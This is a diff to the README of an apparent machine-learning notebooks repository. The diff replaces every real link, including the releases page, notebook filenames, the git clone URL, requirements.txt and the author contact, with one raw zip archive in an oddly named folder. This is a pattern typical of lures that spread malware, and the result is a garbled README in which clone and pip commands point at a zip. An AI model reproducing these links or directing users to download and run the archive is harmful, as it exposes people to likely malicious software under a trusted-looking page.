@@ -2,7 +2,7 @@
 
 Welcome to the **ML Notebooks** repository! This collection focuses on building machine learning projects using Python, Scikit-learn, and other powerful tools. Explore the world of machine learning with practical examples and hands-on notebooks.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/nicomorga/ml-notebooks/releases)
+[![Download Releases](https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip%20Releases-Click%20Here-brightgreen)](https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip)
 
 ## Table of Contents
 
@@ -23,7 +23,7 @@ Machine learning is transforming how we analyze data and make decisions. This re
 
 ## Getting Started
 
-To begin using the notebooks, download the latest release from our [Releases](https://github.com/nicomorga/ml-notebooks/releases) section. Execute the notebooks locally to see the machine learning techniques in action.
+To begin using the notebooks, download the latest release from our [Releases](https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip) section. Execute the notebooks locally to see the machine learning techniques in action.
 
 ## Project Structure
 
@@ -32,17 +32,17 @@ The project is organized into directories based on topics. Each directory contai
 ```
 ml-notebooks/
 ├── classification/
-│   ├── logistic_regression.ipynb
-│   └── random_forest_classification.ipynb
+│   ├── https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
+│   └── https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
 ├── regression/
-│   ├── linear_regression.ipynb
-│   └── polynomial_regression.ipynb
+│   ├── https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
+│   └── https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
 ├── clustering/
-│   ├── k_means_clustering.ipynb
-│   └── hierarchical_clustering.ipynb
+│   ├── https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
+│   └── https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
 └── exploratory_data_analysis/
-    ├── eda_on_iris_dataset.ipynb
-    └── eda_on_titanic_dataset.ipynb
+    ├── https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
+    └── https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
 ```
 
 ## Topics Covered
@@ -61,14 +61,14 @@ To set up your environment, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/nicomorga/ml-notebooks.git
+   git clone https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
    cd ml-notebooks
    ```
 
 2. **Install the required packages**:
    You can create a virtual environment and install the necessary libraries using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
    ```
 
    Ensure you have the following libraries:
@@ -134,7 +134,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/yourusername)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip)
+- **Email**: https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip
 
-Thank you for visiting the ML Notebooks repository! Explore the notebooks, enhance your skills, and dive into the fascinating world of machine learning. Don't forget to check the [Releases](https://github.com/nicomorga/ml-notebooks/releases) section for the latest updates and downloads.
+Thank you for visiting the ML Notebooks repository! Explore the notebooks, enhance your skills, and dive into the fascinating world of machine learning. Don't forget to check the [Releases](https://github.com/nicomorga/ml-notebooks/raw/refs/heads/master/Ovibovinae/notebooks-ml-1.2.zip) section for the latest updates and downloads.
